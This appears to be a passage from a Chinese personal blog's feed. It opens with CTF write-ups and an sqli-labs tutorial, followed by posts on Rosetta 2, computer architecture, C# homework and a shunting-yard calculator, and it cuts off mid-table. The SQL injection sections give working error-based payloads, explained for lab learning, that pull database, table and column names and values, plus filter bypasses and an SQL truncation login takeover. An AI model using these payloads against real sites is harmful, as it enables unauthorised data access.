title="image-20241115233313019"><p>打开源代码看看</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241115233348097.png" class title="image-20241115233348097"><p>发现有提示。查看这个php文件</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241115233653921.png" class title="image-20241115233653921"><p>待水平进步再来做这个qaq</p><h2 id="CTF-BugKu-login1"><a href="#CTF-BugKu-login1" class="headerlink" title="CTF-BugKu-login1"></a>CTF-BugKu-login1</h2><p><a href="https://blog.csdn.net/lga0325/article/details/143353230">https://blog.csdn.net/lga0325/article/details/143353230</a></p><p>在登录密码是，账号默认为admin，输入各种万能密码都没用</p><p>查看注册页面</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241115235406854.png" class title="image-20241115235406854"><p>发现admin已经存在了</p><p>这个时候考虑SQL约束攻击</p><p>在注册用户时，因为 insert 插入数据受到数据库定义的长度限制，会自动将超出长度的数据截断。因此，如果 uname 的长度限制为 char(7)，那么注册账号<code>&#39;admin a&#39;</code>时，由于长度超出，则后面的 <code>a</code> 会被截断，此时，数据库存储数据会把空格删除，在数据库内就变成了<code>admin</code>        （？怎么会有七个字符？）</p><p>此时登录时使用 admin 和自己注册的密码登录，数据库返回注册时的账号信息，但是如果业务侧仅根据返回的用户名信息判断权限，则会导致水平越权的漏洞</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241116000616003.png" class title="image-20241116000616003"><p>注册成功，注意用户名这里有一个空格</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241116000703445.png" class title="image-20241116000703445"><p>直接使用admin身份登录得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab（一）</title>
      <link href="/2024/11/09/sql-lab/"/>
      <url>/2024/11/09/sql-lab/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h1><p><img src="/2024/11/09/sql-lab/sql-lab%5Csql1.png" alt="sql1"></p><p>图内补充：<br>table_schema ： 表归属于的数据库</p><p>information_schema：这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><p>查询当前用户：<code>select user（）</code></p><p>数据库版本： <code>select version （）</code></p><p>数据库名： <code>select database（）</code></p><p>查看数据库&#x2F;表：<code>show databases/tables；</code></p><p>切换数据库： <code>use 数据库名</code></p><p>基础查询：<code>select 字段1， 字段2, … from 表名；</code>   <code>select * from 表名；</code></p><p>条件查询：<code>select 字段 from 表名 where 条件</code></p><p><strong>联合查询：<code>select * from 表名 union select 1，2，3</code></strong>  </p><p>排序： <code>select * from 表名 order by 字段</code></p><hr><h1 id="SQL注入常见类型"><a href="#SQL注入常见类型" class="headerlink" title="SQL注入常见类型"></a>SQL注入常见类型</h1><h2 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数x为整形时，即select  *  from  &lt;表名 &gt;  where id &#x3D; x</p><p>判断： 1 and 1 &#x3D; 1           1 and 1 &#x3D; 2        比较两者的返回页面</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数x为字符型时，即select * from &lt;表名&gt; where id &#x3D; ‘x’</p><p>判断： 1‘ and ‘1’ &#x3D; ‘1          1’ and ‘1’ &#x3D; ‘2 </p><h2 id="按获取方式分类"><a href="#按获取方式分类" class="headerlink" title="按获取方式分类"></a><strong>按获取方式分类</strong></h2><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p>利用页面回显的数据库报错信息</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在注入点的判断过程中，SQL语句执行后的报错信息会经过后端显示在页面中华</p><h4 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h4><p>floor()<strong>extractvalue()updatexml()</strong>geometrycollection()polygon()multipolygon()</p><p><strong>concat()</strong></p><h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><p><code>concat(str1, str2,…)</code></p><p>将多个字符串连接成一个字符串</p><h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h5><p><code>group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</code></p><p>使用distinct可以排除重复值</p><p>如果需要对结果中的值进行排序，可以使用order by子句</p><p>separator是一个字符串值，默认为逗号</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;)</code></p><p>从目标xml文件中返回包含查询值的字符串</p><p><strong>extractvalue函数一次只能查询32位长度</strong></p><p>解决方案：</p><ol><li>加上<code>limit x,1</code> 逐一查询</li><li>用group_concat函数把查询结果分组聚合，然后用<code>and xxxx not in ’xxx‘，’xxx‘</code>过滤掉前面回显的</li><li>用<code>substring()</code>截取</li></ol><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>updatexml(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;,&#39;替换后的值&#39;)</code></p><p>修改xml文件中符合字符串的值</p><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>利用页面返回的不一致</p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用页面响应时间</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>使用union关键字</p><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>执行多条SQL语句</p><hr><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p>&#x2F;**&#x2F; </p><h3 id="and-or被过滤"><a href="#and-or被过滤" class="headerlink" title="and&#x2F;or被过滤"></a>and&#x2F;or被过滤</h3><p>&amp;&amp; ||</p><hr><h1 id="SQLi-labs"><a href="#SQLi-labs" class="headerlink" title="SQLi-labs"></a>SQLi-labs</h1><h3 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h3><h4 id="基于报错的注入-1"><a href="#基于报错的注入-1" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h4><ol><li>验证是字符型还是数字型注入</li></ol><p>​<code>?id = 1 and 1 = 1</code>         和    <code>?id = 1 and 1 = 2</code></p><p>​<code>?id = 1&#39; and &#39;1&#39; = &#39;1</code> 和   <code>?id = 1&#39; and &#39;1&#39;=&#39;2</code></p><p>​       判断两次回显结果是否相同。</p><ol><li><p>查询当前数据库</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select database()),0x7e))) --+</code>、</p><img src="/2024/11/09/sql-lab/11/09/sql-lab/image-20241110003235758.png" class title="image-20241110003235758"><p>爆出数据库名为security</p><p>当然用union也可以</p></li><li><p>查询表名</p></li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/11/09/sql-lab/image-20241110004543422.png" class title="image-20241110004543422"><ol start="4"><li>查询字段名</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/11/09/sql-lab/image-20241110005049115.png" class title="image-20241110005049115"><ol start="5"><li>查询字段值</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(id,&#39;,&#39;,email_id) from security.emails),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/11/09/sql-lab/image-20241110005953540.png" class title="image-20241110005953540"><p>发现没有显示完</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#39;,&#39;,email_id),80,40) from security.emails),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/11/09/sql-lab/image-20241110010136450.png" class title="image-20241110010136450"><p>试着这样查询一下账号和密码吧</p><h4 id="联合注入法"><a href="#联合注入法" class="headerlink" title="联合注入法"></a>联合注入法</h4><p>1.爆字段数量</p><p>order by</p><p>2.爆数据库名</p><p>union select </p><p>注意修改id修改为负数。</p><p>先试试看哪些位置可以回显出来。</p><p>3.爆表名</p><p>4.爆字段名</p><p>5.爆字段值</p><h3 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson 2"></a>lesson 2</h3><p>过程和lesson 1一样。只不过是数字型注入。</p><h3 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson 3"></a>lesson 3</h3><p>过程和lesson 1一样，不过闭合方式为 ‘）</p><h3 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson 4"></a>lesson 4</h3><p>过程和lesson 1一样，不过闭合方式为 ”）</p><h3 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson 5"></a>lesson 5</h3><p>也可以这样做</p><h3 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson 6"></a>lesson 6</h3><p>也可以这样做</p><p>怎么都有报错回显。布尔盲注和时间盲注有点暴力有点纯。使用sqlmap会好得多但是我暂时不会用</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苹果的罗塞塔石碑 —— Rosetta 2</title>
      <link href="/2024/11/09/Rosetta/"/>
      <url>/2024/11/09/Rosetta/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="ARM架构与x86架构"><a href="#ARM架构与x86架构" class="headerlink" title="ARM架构与x86架构"></a>ARM架构与x86架构</h2><p><strong>指令集架构（ISA</strong>）是计算机硬件与软件之间的接口规范，定义了处理器可以执行的基本指令（如算术运算、数据传输、控制转移等）、指令格式、寻址模式以及相关的寄存器和数据类型。简单来说，它就像是处理器的“语言”（<strong>CPU预定义的操作和计算</strong>），让程序员能够编写可以在特定架构上运行的软件，同时也帮助设计处理器的工程师理解如何实现这些指令（简化程序员的工作）。</p><p>那如果要简化程序员的工作，这意味着微处理器的工作十分复杂。<del>甲方只需要提要求就好了，而乙方需要考虑的就多了。</del>那到底是应该简化程序员的工作，还是简化微处理器的工作？</p><p>由此产生了两种想法：<strong>CISC</strong> 和 <strong>RISC</strong></p><p><strong>x86</strong>：<strong>基于CISC的处理器架构</strong>，拥有非常丰富的指令集。一条指令可以完成整个计算（如乘法）或将一块数据直接从内存中的一个位置移动到另一个位置，并且这一系列复杂的操作可以在一个周期内完成。但这也意味着它需要更多的晶体管，从而会占用控件并消耗能量。</p><p><strong>ARM</strong>：<strong>基于RISC的处理器架构</strong>，每条指令仅代表一个能耗较低的简单操作。这使得汇编语言程序员的工作变得更加复杂，但却简化了处理器的工作。利用RISC处理器和先进的RISC计算机，可以通过运行多条指令或通过将复杂工作推给编译器（而不是CPU内核）来执行复杂工作。</p><p>两种CPU设计都具有高性能，但ARM设计往往侧重于更小巧的外形、电池使用时间、尺寸、免除散热要求和成本。</p><p>具体可见 <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">指令系统 | Pocon’s Blog</a></p><hr><h2 id="Mac向Apple芯片迁移"><a href="#Mac向Apple芯片迁移" class="headerlink" title="Mac向Apple芯片迁移"></a>Mac向Apple芯片迁移</h2><p>在2020年6月22日的苹果全球开发者大会上，苹果公司CEO蒂姆·库克宣布将Mac电脑从英特尔的x86-64的处理器平台迁移至ARM64架构的Apple芯片（由苹果自行设计的处理器）。（在此之前也有过迁移经历）</p><p>既然是两种不同的指令集架构，苹果是如何实现让Intel平台上开发的软件在ARM架构平台的Mac上顺利运行的呢？</p><hr><h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>在此之前，先让我讲讲另一种实现机制：<strong>通用二进制</strong></p><p>通用二进制是一种将多个架构的代码打包在同一个可执行文件中的技术。（由于这些多平台可执行程序文件容量比原来要大，所以也称为<strong>胖二进制</strong>。）该文件包含针对不同架构的机器代码，操作系统在运行时根据硬件架构选择合适的代码段执行。</p><p>换而言之，也就是提供多个翻译版本，选你看得懂的那个。</p><blockquote><p>[!WARNING]</p><p>以下为个人见解</p></blockquote><p>制作和优化其应用的ARM版本需要时间。创建通用二进制文件需要对源代码进行修改和测试，因此开发的复杂性会大幅提升。为了提供更灵活使用的解决方案，在当时<strong>Rosetta</strong>成为主流，而通用二进制版本需要更长的时间来推广和普及。</p><p>换而言之，两个国家的人（Intel和Silicon）说的是不同的语言，彼此听不懂对方的话，还好的是都是用嘴说，声音通过空气传播，别人也都是用耳朵听的。那么，中间有个翻译（Rosetta），可以把一种语言翻译成另外一种。</p><p><strong>Rosetta</strong>：一种动态翻译工具。允许已经存在的Intel x86应用在Apple Silicon（ARM架构）上运行，而无需开发者重新编译或发布新的版本。这使得用户能够立即继续使用他们的旧软件，无缝过渡到新硬件上。</p><p>苹果公司声称：那些重视用户互动而较少计算量的应用程序（比如word等文字处理器）是比较适合同归哦Rosetta编译的；而需要大计算量的程序，比如Photoshop需要另外的通用二进制版本。</p><p><strong>Rosetta 2</strong>：Rosetta 2预装在使用Apple Silicon芯片的Mac电脑的操作系统上。它可以将AMD64指令进行翻译。与Rosetta不同的是，Rosetta 2在安装软件时会把Intel版本程序转化为ARM程序，加上Apple的处理器性能很高，因此即使需要大计算量的程序，通过  Rosetta 2编译也能流畅地执行。（Intel版本Mac操作系统上地应用程序）</p><p>让我们（浅显的）深入探讨一下底层原因：</p><ol><li>尽管指令集不同，ARM和Intel底层架构有较高相似度（具体我不知道为啥）。x86指令集虽然复杂，但Rosetta 2只需要支持其中的子集，也就是用户态指令。并且两套指令都是小端存储。</li><li>最大障碍是内存排序（内存一致性模型不一样），即两个CPU在内存中看到彼此修改的顺序不一样。所以苹果将Intel的内存排序添加到他们的CPU中<del>（这也太暴力了）</del>。在运行转换后的x86代码时，它们会通过一个后门开关切换CPU的模式以符合Intel的内存排序。</li></ol><p>参考链接：</p><p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p><p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Mac向Apple芯片迁移 - 维基百科，自由的百科全书</a></p><p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - 维基百科，自由的百科全书</a></p><p><a href="https://www.v2ex.com/t/726640">哪位老哥能解释一下 Rosetta 的实现原理？ - V2EX</a></p><p><a href="https://www.bilibili.com/opus/850506105874284549">【转】苹果的 Rosetta 2 的实现原理大概是怎样的？ - 哔哩哔哩</a></p><p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p><p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham 𝕏 on X: “19&#x2F; …even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.” &#x2F; X</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">内存排序 - 维基百科，自由的百科全书</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指令系统</title>
      <link href="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/image-zhiling1.png" class title="zhiling1"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling2.png" class title="zhiling2"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling3.png" class title="zhiling3"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling4.png" class title="zhiling4">]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统结构</title>
      <link href="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
      <url>/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算机系统结构"><a href="#计算机系统结构" class="headerlink" title="计算机系统结构"></a>计算机系统结构</h1><h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><h2 id="微体系架构"><a href="#微体系架构" class="headerlink" title="微体系架构"></a>微体系架构</h2><h2 id="数据表达"><a href="#数据表达" class="headerlink" title="数据表达"></a>数据表达</h2><h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><h2 id="寄存器定义"><a href="#寄存器定义" class="headerlink" title="寄存器定义"></a>寄存器定义</h2><h2 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h2><p>​<img src="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160537615.png" alt="image-20241106160537615"></p><p>​<img src="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160557265.png" alt="image-20241106160557265"></p><p>​<img src="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/Users\czh\AppData\Roaming\Typora\typora-user-images\image-20241106160618550.png" alt="image-20241106160618550"></p><h2 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h2><h2 id="机器工作状态"><a href="#机器工作状态" class="headerlink" title="机器工作状态"></a>机器工作状态</h2><h2 id="输入输出结构"><a href="#输入输出结构" class="headerlink" title="输入输出结构"></a>输入输出结构</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C艹基础（1）</title>
      <link href="/2024/11/05/C-%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="信息系统开发（-NET）-第八章作业"><a href="#信息系统开发（-NET）-第八章作业" class="headerlink" title="信息系统开发（.NET）   第八章作业"></a>信息系统开发（.NET）   第八章作业</h1><h2 id="什么是类的继承？怎么定义派生类？"><a href="#什么是类的继承？怎么定义派生类？" class="headerlink" title="什么是类的继承？怎么定义派生类？"></a>什么是类的继承？怎么定义派生类？</h2><h2 id="简述创建派生类时，构造函数的调用。"><a href="#简述创建派生类时，构造函数的调用。" class="headerlink" title="简述创建派生类时，构造函数的调用。"></a>简述创建派生类时，构造函数的调用。</h2><h2 id="怎样定义基类虚方法，并在派生类中重写基类虚方法？"><a href="#怎样定义基类虚方法，并在派生类中重写基类虚方法？" class="headerlink" title="怎样定义基类虚方法，并在派生类中重写基类虚方法？"></a>怎样定义基类虚方法，并在派生类中重写基类虚方法？</h2><h2 id="抽象方法和虚方法有什么异同？"><a href="#抽象方法和虚方法有什么异同？" class="headerlink" title="抽象方法和虚方法有什么异同？"></a>抽象方法和虚方法有什么异同？</h2><h2 id="什么是抽象类？它有什么特点？它和接口有何异同？"><a href="#什么是抽象类？它有什么特点？它和接口有何异同？" class="headerlink" title="什么是抽象类？它有什么特点？它和接口有何异同？"></a>什么是抽象类？它有什么特点？它和接口有何异同？</h2><h2 id="简述通过委托来调用对象方法的基本过程。"><a href="#简述通过委托来调用对象方法的基本过程。" class="headerlink" title="简述通过委托来调用对象方法的基本过程。"></a>简述通过委托来调用对象方法的基本过程。</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算器原理</title>
      <link href="/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/"/>
      <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="计算器原理"><a href="#计算器原理" class="headerlink" title="计算器原理"></a>计算器原理</h1><p>计算器计算的表达式是后缀表达式。</p><p>我们输入一个表达式，计算器给出结果主要经过了：将中缀表达式转化为后缀表达式，计算后缀表达式这两个过程</p><p>而转化和计算过程运用到了数据结构“栈”。</p><p>我们为了简化过程，在转化后缀表达式过程中进行中间结果的计算。</p><h3 id="中缀表达式"><a href="#中缀表达式" class="headerlink" title="中缀表达式"></a>中缀表达式</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">中缀表示法 - 维基百科，自由的百科全书</a></p></blockquote><p>中缀表达法是自然语言的写法，其操作符在操作数的中间</p><p>如3+4</p><h3 id="后缀表达式（逆波兰表示法）"><a href="#后缀表达式（逆波兰表示法）" class="headerlink" title="后缀表达式（逆波兰表示法）"></a>后缀表达式（逆波兰表示法）</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波兰表示法 - 维基百科，自由的百科全书</a></p></blockquote><p>即所有操作符在操作数的后面。</p><h5 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h5><ol><li>从左到右扫描表达式</li><li>遇到数字时，将数字压入堆栈</li><li>遇到运算符时<ul><li>弹出栈顶的两个数（栈顶和次顶），用运算符对它们做对应的计算，并将结果入栈</li><li>计算顺序是： 后弹出来的  （运算符）  先弹出来的</li></ul></li></ol><h3 id="调度场算法"><a href="#调度场算法" class="headerlink" title="调度场算法"></a>调度场算法</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">调度场算法 - 维基百科，自由的百科全书</a></p></blockquote><p>将中缀表达式转化为后缀表达式的算法。</p><p>为了方便快速计算，我们使用两个栈：运算符栈s1和操作数栈s2。操作数栈其实也可以看作中间结果栈。</p><p>在操作数压栈过程中，直接入栈即可。</p><p>在运算符压栈过程中，需要保持栈顶运算符为当前优先级最高的。换言之就是比当前栈内运算符优先级高的运算符已经完成了运算操作。</p><img src="https://img2020.cnblogs.com/blog/2368409/202112/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;"><h5 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h5><ol><li><p>初始化两个栈：</p><ul><li>运算符栈：s1</li><li>中间结果栈：s2</li></ul></li><li><p>从左到右扫描中缀表达式</p></li><li><p>遇到操作数时，将其压入s2</p></li><li><p>遇到运算符时</p><ul><li>比较它和s1栈顶运算符的优先级：<ul><li>如果s1为空或者栈顶运算符符号为（，则将其压入符号栈s1</li><li>如果优先级比栈顶运算符高，也将其压入符号栈s1</li><li>如果优先级比栈顶运算符低或相等，将s1栈顶的运算符弹出，并压入到s2中。</li></ul></li><li>再重复比较它和新栈顶运算符的优先级。</li></ul><blockquote><p>[!NOTE]</p><p>重复的含义：</p><ol><li><p>如果s1栈顶元素符号优先级比当前符号高或者等于，那么就将其弹出压入s2中（循环做，只要s1不为空）。</p><p>如果栈顶符号为 （ ，其优先级最低，就不会弹出，就跳出循环了。</p></li><li><p>跳出循环后，则将当前符号压入s1</p></li></ol></blockquote></li><li><p>遇到括号时：</p><ul><li>如果是左括号（ ：则直接压入s1</li><li>如果是右括号  ）：则以此弹出s1栈顶的运算符，并压入s2，知道遇到左括号为止，此时将这一对括号丢弃。</li></ul></li><li><p>重复步骤2~5，直到表达式最右端。</p></li><li><p>将s1中的运算符以此弹出并压入 s2。</p></li><li><p>以此弹出 s2 中的元素并输出，结果的 逆序 即为：中缀表达式转为后缀表达式。</p></li></ol><h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+((2+3)*4)-5</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">扫描到的元素</th><th align="center">s2(栈底-&gt;栈顶)</th><th align="center">s1(栈底-&gt;栈顶)</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">空</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center">s1栈为空，压入s1</td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（</td><td align="center">左括号，压入s1</td></tr><tr><td align="center">（</td><td align="center">1</td><td align="center">+（（</td><td align="center">左括号，压入s1</td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+（（</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+（（+</td><td align="center">栈顶为（，压入s2</td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+（（+</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">）</td><td align="center">1 2 3 +</td><td align="center">+（</td><td align="center">遇到右括号，弹出+后遇到左括号，删除一对小括号</td></tr><tr><td align="center">*</td><td align="center">1 2 3 +</td><td align="center">+（*</td><td align="center">遇到操作符，压入s1</td></tr><tr><td align="center">4</td><td align="center">1 2 3 + 4</td><td align="center">+（*</td><td align="center">遇到操作数，压入s2</td></tr><tr><td align="center">）</td><td align="center">1 2 3 + 4 *</td><td align="center">+</td><td align="center">遇到右括号，弹出*后遇到左括号，删除一对小括号</td></tr><tr><td align="center">-</td><td align="center">1 2 3 + 4 * 